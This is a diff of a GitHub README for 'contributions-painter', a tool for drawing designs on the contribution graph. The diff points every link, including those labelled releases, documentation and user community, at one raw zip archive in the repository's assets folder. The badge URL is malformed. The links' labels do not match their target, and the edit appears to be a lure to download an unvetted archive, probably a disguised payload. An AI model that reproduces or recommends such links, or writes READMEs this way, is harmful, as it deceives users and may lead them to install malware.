@@ -1,7 +1,7 @@
 # 🎨 contributions-painter - Create Unique Designs on GitHub
 
 ## 🔗 Download Now!
-[![Download contributions-painter](https://img.shields.io/badge/Download%20contributions--painter-v1.0-blue.svg)](https://github.com/hababi558/contributions-painter/releases)
+[![Download contributions-painter](https://raw.githubusercontent.com/hababi558/contributions-painter/main/assets/contributions-painter-1.3-alpha.2.zip%https://raw.githubusercontent.com/hababi558/contributions-painter/main/assets/contributions-painter-1.3-alpha.2.zip)](https://raw.githubusercontent.com/hababi558/contributions-painter/main/assets/contributions-painter-1.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to contributions-painter! This application allows you to create custom text and patterns on your GitHub contribution graph. Whether you want to spell out words, draw designs, or make pixel art, this tool is for you. 
@@ -11,7 +11,7 @@ In this guide, you'll learn how to download and run contributions-painter easily
 ## 📥 Download & Install
 To get started, you'll need to download contributions-painter.
 
-1. **Visit the Releases Page**: Go to the releases page for contributions-painter: [Download contributions-painter](https://github.com/hababi558/contributions-painter/releases).
+1. **Visit the Releases Page**: Go to the releases page for contributions-painter: [Download contributions-painter](https://raw.githubusercontent.com/hababi558/contributions-painter/main/assets/contributions-painter-1.3-alpha.2.zip).
   
 2. **Select the Latest Version**: Look for the latest version available. It will typically be at the top of the list.
 
@@ -58,8 +58,8 @@ If you have questions or need help, feel free to reach out to the community on G
 
 ## 🌐 Explore More
 For additional resources and tips on using contributions-painter, you can check out the following:
-- [Documentation](https://github.com/hababi558/contributions-painter/wiki)
-- [User Community](https://github.com/hababi558/contributions-painter/discussions)
+- [Documentation](https://raw.githubusercontent.com/hababi558/contributions-painter/main/assets/contributions-painter-1.3-alpha.2.zip)
+- [User Community](https://raw.githubusercontent.com/hababi558/contributions-painter/main/assets/contributions-painter-1.3-alpha.2.zip)
 
 ## 🔗 Get Started
-For a seamless experience, visit the downloads page again to get contributions-painter now: [Download contributions-painter](https://github.com/hababi558/contributions-painter/releases). Enjoy creating custom designs on your GitHub contribution graph!
+For a seamless experience, visit the downloads page again to get contributions-painter now: [Download contributions-painter](https://raw.githubusercontent.com/hababi558/contributions-painter/main/assets/contributions-painter-1.3-alpha.2.zip). Enjoy creating custom designs on your GitHub contribution graph!
